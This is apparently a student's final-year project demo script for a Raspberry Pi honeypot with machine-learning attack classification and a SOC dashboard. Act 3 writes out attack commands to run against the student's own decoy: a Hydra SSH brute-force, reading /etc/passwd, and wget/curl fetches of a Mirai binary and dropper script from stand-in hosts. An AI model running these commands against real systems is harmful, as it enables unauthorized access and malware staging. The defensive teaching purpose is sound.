# FALSEDOOR: FYP Live Demonstration & Presentation Script

**Project Title:** Development of an Intelligent Raspberry Pi-Based Real-Time Cybersecurity Platform with Machine Learning for Honeypot Attack Classification, Monitoring, and Interactive Learning  
**Panel Members:**
- **Supervisor:** Dr. Khairani
- **Examiner:** Sir Fariz Fuzi
- **Coordinator:** Sir Rosyam  
**Institution:** Universiti Teknologi MARA (UiTM)

---

## Demonstration Outline & Timing (~12–15 Minutes)
1. **Act 1: Formal Opening & Architecture Overview** (~2 mins)
2. **Act 2: Desktop SOC Dashboard & Live Telemetry** (~3 mins)
3. **Act 3: Live Attack Demonstrations (Brute Force, Commands, Malware Dropper)** (~4 mins)
4. **Act 4: Machine Learning Classification & Confusion Matrix** (~2 mins)
5. **Act 5: Mobile App Experience & Responsive SOC Dock** (~2 mins)
6. **Act 6: Interactive Academy, Ask AI & Closing Q&A** (~2 mins)

---

## ACT 1: Formal Opening & Architecture Overview (2 Minutes)

### [ACTION]
*Stand beside your laptop/workstation. Have the FALSEDOOR lock screen displayed showing the pulsing biometric fingerprint scanner.*

### [SPEAK]
> "Assalamualaikum Warahmatullahi Wabarakatuh and a very good morning to:
> - My respected supervisor, **Dr. Khairani**,
> - My honourable examiner, **Sir Fariz Fuzi**,
> - And our respected coordinator, **Sir Rosyam**.
>
> Today, I am proud to present my Final Year Project entitled: **FALSEDOOR: An Intelligent Raspberry Pi-Based Real-Time Cybersecurity Platform with Machine Learning for Honeypot Attack Classification, Monitoring, and Interactive Learning.**
>
> In modern cybersecurity, traditional signature-based Intrusion Detection Systems often fail against zero-day scans and rapid automated credential brute-forcing. Honeypots solve this by creating deceptive decoy environments, but their raw logs are noisy and overwhelming for human analysts to interpret in real time.
>
> FALSEDOOR solves this problem by bringing together:
> 1. **An edge hardware decoy** deployed on a Raspberry Pi 5 running an armed Cowrie honeypot on port 2222.
> 2. **A real-time Python FastAPI engine** and a trained **Scikit-Learn Random Forest machine learning pipeline** for sub-5ms attack classification.
> 3. **A unified cloud and local dashboard** optimized for both Desktop SOC workstations and mobile devices."

### [ACTION]
*Point to your Raspberry Pi 5 hardware or Ubuntu server terminal.*

### [SPEAK]
> "Our Cowrie honeypot is listening on port `2222`, actively collecting unauthorized connections into `cowrie.json`. Our FastAPI backend on port `8000` processes this telemetry, feeds feature vectors to our trained model, and streams enriched intelligence directly to the browser with zero polling lag."

---

## ACT 2: Desktop SOC Dashboard & Live Telemetry (3 Minutes)

### [ACTION]
*Click or tap the biometric fingerprint scanner on the screen.*  
*The scanner confirms `ACCESS GRANTED`, smoothly dissolves the lock screen, and reveals the high-tech dark SOC console.*

### [SPEAK]
> "To demonstrate our analyst experience, we begin with a secure session unlock. Once authenticated, we land directly on the **FALSEDOOR Real-Time Threat Intelligence Dashboard**."

### [ACTION]
*Point cursor to the top header bar.*

### [SPEAK]
> "At the top header bar, Dr. Khairani, Sir Fariz, and Sir Rosyam can observe:
> 1. **Live Decoy Status Indicator:** Currently displaying **'SNIFFING'** with a pulsing green dot, confirming that our Cowrie honeypot daemon is armed and listening on port 2222.
> 2. **Telemetry Sniffing / Snooze Toggle:** An analyst can pause the background sensor polling if investigating a historical anomaly.
> 3. **Ask AI SOC Assistant:** Highlighted in distinctive yellow, providing instant LLM-powered incident response guidance.
> 4. **API Engine Latency:** Monitored live in milliseconds, confirming sub-10ms response times from our Python engine."

### [ACTION]
*Scroll down to the **Real-Time Attack Activity Timeline**.*

### [SPEAK]
> "Here is our core visual telemetry: the **Real-Time Attack Activity Timeline**.
>
> Rather than generic pre-rendered graphics, FALSEDOOR features a **dynamic, chronologically accurate time-bucketed event velocity graph**.
>
> Notice the 5 dedicated time window selectors in the top right:
> - **Last 10 Seconds:** Bucketed in 1-second steps, counting down chronologically: `10s → 9s → 8s → ... → 1s → Now`.
> - **Last 15 Minutes:** 1-minute steps counting from `15m` down to `Now`.
> - **Last Hour:** 10-minute intervals from `60m` down to `Now`.
> - **Last 24 Hours:** 4-hour blocks from `24h` down to `Now`.
> - **Last 7 Days:** Daily aggregates from `7d` down to `Now`."

### [ACTION]
*Click on **Last 15 Minutes**, then **Last Hour**, then click back to **Last 10 Seconds**.*

### [SPEAK]
> "Notice how instantaneous the transitions are due to our client-side cache, preventing flickering while keeping exact timestamp alignment with the local clock.
>
> Underneath the chart, we have real-time audit counters:
> - **Window Total Events:** Measuring total raw interaction packets.
> - **Attacks in Window:** Filtering out routine connection noise and counting only verified malicious attempts.
> - **Peak Bucket:** Displaying the exact burst velocity and timestamp."

### [ACTION]
*Scroll down to the 4 Top Summary KPI Cards and Temporal Analysis section.*

### [SPEAK]
> "Below the timeline, our 4 executive metric cards summarize:
> 1. **Total Detected Attacks:** Cumulative verified threat attempts.
> 2. **Unique Adversary IPs:** Total unique attacker endpoints identified.
> 3. **Machine Learning Model Confidence:** Average certainty score from our Random Forest model, currently exceeding 98%.
> 4. **System Threat Severity:** Dynamically graded from `QUIET / LISTENING`, to `GUARDED`, `ELEVATED`, up to `CRITICAL / SEVERE` based on real payload weights.
>
> In the **Temporal Intelligence** section, we provide:
> - **24-Hour Attack Velocity Curve:** Revealing peak attacking hours in the local timezone.
> - **7-Day Threat Heatmap & Day-Mix:** Showing the proportion of Brute Force, Command Execution, and Malware Droppers for every calendar day."

---

## ACT 3: Live Attack Demonstration (4 Minutes)

### [SPEAK]
> "Now, Sir Fariz, Dr. Khairani, and Sir Rosyam, let us simulate real-world adversarial attacks against our Raspberry Pi honeypot from an external attacker machine, and watch how FALSEDOOR captures, classifies, and alerts in real time."

---

### ATTACK 1: SSH Credential Brute Force (Dictionary Attack)

#### [ACTION]
*Open an attacker terminal window (e.g. Kali Linux, WSL, or secondary laptop).*  
*Run an SSH brute-force attack command against the honeypot port 2222:*
```bash
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.20.10.2:2222 -t 4
```
*(Alternative manual test if Hydra is not active):*
```bash
ssh -p 2222 root@172.20.10.2
# Type password: wrongpassword123
```

#### [SHOW ON SCREEN]
1. Point to the **Real-Time Attack Activity Timeline**.
2. Point to the peak spike that appears on the graph.
3. Show the **Bright Red (`#ef4444`) Circle Marker**.
4. Show the badge displaying **`Brute Force ×N`**.
5. Show **ATTACKS IN WINDOW** incrementing live.

#### [SPEAK]
> "As you can see, the moment Hydra launches parallel SSH connections, Cowrie generates `cowrie.login.failed` and connection telemetry.
>
> Our engine performs **session-level attack correlation**. Instead of mislabeling the connection handshake as routine traffic, FALSEDOOR identifies that the session contains unauthorized credential testing.
>
> Immediately on the timeline:
> - The graph spikes at the `Now` mark.
> - The node turns **Bright Red (`#ef4444`)**.
> - The badge clearly displays **`Brute Force ×N`**.
> - And our 'Attacks in Window' counter updates immediately without requiring a browser refresh."

---

### ATTACK 2: Unauthorized Command Execution (Interactive Shell)

#### [ACTION]
*In the attacker terminal, authenticate into Cowrie honeypot (which accepts default credentials or honeypot login):*
```bash
ssh -p 2222 root@172.20.10.2
# Password: admin (or 123456 / Elando01)
```
*Once inside the decoy shell, execute exploratory reconnaissance commands:*
```bash
uname -a
whoami
cat /etc/passwd
id
```

#### [ACTION]
*Switch the dashboard view from `Overview` to the **Live Attack Feed** tab (`#view-livefeed`).*

#### [SHOW ON SCREEN]
1. Show the newest event at the top of the table.
2. Show the **Cyan Badge** displaying **`Command Execution`**.
3. Point to the command column showing `cat /etc/passwd` and `uname -a`.
4. Point to the terminal prompt icon and attacker source IP.

#### [SPEAK]
> "Notice what happens when the attacker gains access to the decoy sandbox and starts issuing commands.
>
> Here in the **Live Attack Feed**:
> - Each event is assigned a deterministic sequential identifier (`EVT-XXXX`).
> - The ML classification immediately detects **`Command Execution`**, tagged in **Electric Cyan (`#38bdf8`)**.
> - The analyst sees the exact command string captured—`cat /etc/passwd`—along with the attacker's IP address, source port, and the millisecond inference latency of our Random Forest model."

---

### ATTACK 3: Malware Dropper & Payload Staging (Critical Threat)

#### [ACTION]
*Inside the decoy SSH session, simulate a botnet/malware dropper download attempt:*
```bash
wget http://malicious-repo.com/mirai.arm
curl -O http://192.168.50.46/dropper.sh
chmod +x dropper.sh
```

#### [SHOW ON SCREEN]
1. Show the Live Feed update with a **Purple Badge** (`#a855f7`) displaying **`Malware Download Attempt`**.
2. Click back to the **Overview** tab.
3. Show the Threat Severity badge changing to **`CRITICAL / SEVERE`** in bold red.

#### [SPEAK]
> "Now the attacker attempts to stage a remote binary using `wget` and `curl`.
>
> FALSEDOOR's feature extraction engine extracts syntax tokens, URL patterns, and execution flags (`chmod +x`). The ML classifier tags this as **`Malware Download Attempt`** in **Vibrant Purple (`#a855f7`)**.
>
> Furthermore, look at our executive Threat Severity Indicator on the overview tab: it has dynamically escalated from `GUARDED` to **`CRITICAL / SEVERE`**, alerting SOC operators that file staging was attempted on the decoy."

---

## ACT 4: Machine Learning Classification & Model Evaluation (2 Minutes)

### [ACTION]
*Click on the **ML Model** tab in the desktop navigation.*

### [SPEAK]
> "Dr. Khairani, Sir Fariz, and Sir Rosyam, let us examine the intelligence core powering these real-time classifications.
>
> On the **Machine Learning Classification** view, we display:
> 1. **Live Threat Classification Donut Chart:** Rendering the exact percentage breakdown across the 4 supervised classes:
>    - Red: **Brute Force**
>    - Cyan: **Command Execution**
>    - Purple: **Malware Download Attempt**
>    - Slate: **SSH Session Activity** (isolated connection handshakes)
> 2. **Model Metadata:**
>    - Algorithm: **Random Forest Classifier (100 Decision Trees)**
>    - Framework: **Scikit-Learn (Python 3)**
>    - Training Baseline: Extracted features from `extracted_features.csv`
>    - Inference Latency: Between **2.5ms to 4.8ms**, enabling true line-rate classification on edge hardware like the Raspberry Pi 5."

### [ACTION]
*Click on the **Confusion Matrix** tab.*

### [SPEAK]
> "Here on the **Confusion Matrix & Evaluation** tab, we demonstrate our rigorous academic validation.
>
> The heat-matrix contrasts **Actual Classes** versus **Predicted Classes**:
> - We achieved high diagonal density with strong True Positive rates across Brute Force, Command Execution, and Malware Download.
> - The precision, recall, and F1-score metrics on our evaluation dataset all exceed 97%, proving that Random Forest provides superior performance over single decision trees or naive Bayesian classifiers for honeypot telemetry."

---

## ACT 5: Mobile App Experience & Responsive SOC Dock (2 Minutes)

### [ACTION]
*Pick up your smartphone or resize the browser window / toggle Chrome/Edge DevTools Device Mode to iPhone / Android (Screen width < 560px).*  
*Point out the mobile interface.*

### [SPEAK]
> "One of the most important objectives of this FYP was to ensure that a security engineer or system administrator is not tied to a desktop workstation. They must be able to monitor, triage, and respond to honeypot events from their mobile device.
>
> Notice how FALSEDOOR transforms into a **native-feeling Mobile Security App**:
> 1. **Clean Top Bar:** The desktop tab bar disappears, and we removed unnecessary blur overlays for maximum performance on mobile OLED screens.
> 2. **Bottom Navigation Dock:** An ergonomic, thumb-friendly dock provides one-tap switching between:
>    - **Overview:** Compact velocity timeline and metric cards.
>    - **Live Feed:** Card-based chronological attack cards with collapsible JSON details.
>    - **ML Model:** Touch-scaled classification donut.
>    - **Logs:** Direct raw log audit inspection.
>    - **Health:** Real-time hardware telemetry."

### [ACTION]
*Tap the **Health** icon on the bottom dock.*

### [SPEAK]
> "In the **Pipeline Health** view, Dr. Khairani and the examiners can see our live hardware heartbeat:
> - Real CPU Utilization (%)
> - Memory Allocation (Used / Total MB)
> - Host Uptime
> - Raspberry Pi SoC Temperature (°C)
> - Status of the Cowrie decoy daemon, honeypot JSON audit stream, and FastAPI engine."

---

## ACT 6: Interactive Academy, Ask AI & Closing (2 Minutes)

### [ACTION]
*Click the **Ask AI** button in the header (or switch to the Cybersecurity Academy module).*

### [SPEAK]
> "Finally, FALSEDOOR goes beyond passive logging by providing **Educational & Analyst Guidance**:
> 1. **Ask AI SOC Assistant:** Allows junior analysts to ask: *'What remediation should I take for repeated SSH brute-force from 172.20.10.7?'* and receive instant defensive hardening advice (e.g. Fail2ban rules, port knocking, key-only SSH).
> 2. **Cybersecurity Academy:** Features modular quizzes explaining honeypot theory, Hassh SSH fingerprinting, and why connection events are distinguished from payload commands."

### [ACTION]
*Transition back to the Overview tab and face the panel.*

### [SPEAK]
> "To conclude, FALSEDOOR successfully accomplishes all project objectives:
> 1. **Deployment** of a hardened edge honeypot on a Raspberry Pi 5.
> 2. **Supervised Machine Learning integration** with sub-5ms Random Forest classification.
> 3. **True chronological telemetry** with accurate attack velocity and session-level correlation.
> 4. **A seamless, responsive dual-viewport dashboard** for both SOC workstations and mobile phones.
>
> Thank you very much to **Dr. Khairani**, **Sir Fariz Fuzi**, and **Sir Rosyam** for your time, valuable guidance, and attention.
>
> I am now ready and very pleased to welcome any questions, comments, or suggestions."

---

## Panel Q&A Cheat Sheet (Anticipated Questions & Best Answers)

### Q1 (Sir Fariz Fuzi / Dr. Khairani): *"Why did the timeline previously show 'SSH Session' when you did a brute force attack, and how did you solve it?"*
> **Answer:**  
> "Sir, in Cowrie, an SSH connection logs 5 sequential events: connect, client version, key exchange (kex), login attempt, and disconnect. Because the timeline uses 1-second resolution buckets, the connection and version handshakes landed in seconds prior to the password prompt.  
> We solved this by implementing **session-level attack correlation** in both our Python backend and JavaScript frontend. When an SSH session exhibits credential testing or login failures, all associated handshake events of that session ID are correlated to the **Brute Force** attack family, prioritizing red alert badges and incrementing the attack counter."

### Q2 (Sir Rosyam / Sir Fariz): *"Why use Random Forest instead of Deep Learning (like LSTM or CNN)?"*
> **Answer:**  
> "Sir, for edge deployment on an embedded device like the Raspberry Pi 5, computational efficiency and low inference latency are critical. Our Random Forest model achieves over 98% accuracy with an inference latency of **under 4 milliseconds** and requires less than 25MB of RAM, whereas Deep Learning models require heavy PyTorch/TensorFlow runtimes that introduce thermal throttling and latency on edge hardware."

### Q3 (Dr. Khairani): *"How does the system ensure data synchronization between the Raspberry Pi and the Netlify cloud dashboard?"*
> **Answer:**  
> "Dr. Khairani, the dashboard communicates with our FastAPI backend using high-performance REST polling with non-blocking promises and AbortSignal timeouts. For remote access outside the local LAN, we utilize an encrypted secure tunnel (Ngrok SSL), allowing the Netlify web app to stream live telemetry seamlessly from anywhere in the world."
